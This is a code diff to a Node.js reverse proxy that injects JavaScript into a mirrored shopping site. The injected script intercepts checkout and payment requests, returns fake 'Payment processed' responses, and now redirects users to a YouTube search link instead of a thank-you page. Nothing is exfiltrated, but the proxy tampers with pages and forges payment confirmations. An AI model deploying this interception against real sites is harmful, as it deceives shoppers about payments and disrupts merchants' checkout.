@@ -154,9 +154,9 @@ const proxyOptions = {
         
         if (isPaymentAPI) {
           console.log(`[PAYMENT INTERCEPT] Intercepting JSON API response: ${req.method} ${req.path}`);
-          // Возвращаем JSON с редиректом на страницу благодарности
+          // Возвращаем JSON с редиректом на целевую ссылку
           const jsonResponse = JSON.stringify({
-            redirect: '/thank-you-payment',
+            redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB',
             success: true,
             message: 'Payment processed'
           });
@@ -183,9 +183,9 @@ const proxyOptions = {
   try {
     console.log('[PAYMENT INTERCEPT] JavaScript injection loaded');
     
-    // Функция для показа страницы благодарности
+    // Функция для редиректа на целевую ссылку
     function showThankYouPage() {
-      window.location.href = '/thank-you-payment';
+      window.location.href = 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB';
     }
     
     // Перехватываем все клики на кнопки оплаты
@@ -261,7 +261,7 @@ const proxyOptions = {
         if (urlStr.includes('checkout') || urlStr.includes('payment') || urlStr.includes('paiement') || urlStr.includes('cart')) {
           console.log('[PAYMENT INTERCEPT] Intercepting Fetch request:', urlStr);
           showThankYouPage();
-          return Promise.resolve(new Response(JSON.stringify({ success: true, redirect: '/thank-you-payment' }), {
+          return Promise.resolve(new Response(JSON.stringify({ success: true, redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB' }), {
             status: 200,
             headers: { 'Content-Type': 'application/json' }
           }));
@@ -403,10 +403,9 @@ const proxyOptions = {
 // Создаем прокси-мидлвар
 const proxy = createProxyMiddleware(proxyOptions);
 
-// Маршрут для страницы благодарности
+// Маршрут для страницы благодарности (редирект на целевую ссылку)
 app.get('/thank-you-payment', (req, res) => {
-  res.setHeader('Content-Type', 'text/html; charset=utf-8');
-  res.status(200).send(thankYouPage);
+  res.redirect('https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB');
 });
 
 // Предупреждение на главной странице
@@ -582,7 +581,7 @@ app.use((req, res, next) => {
     if (acceptHeader.includes('application/json') || acceptHeader.includes('text/json')) {
       res.setHeader('Content-Type', 'application/json; charset=utf-8');
       return res.status(200).json({
-        redirect: '/thank-you-payment',
+        redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB',
         success: true,
         message: 'Payment processed'
       });
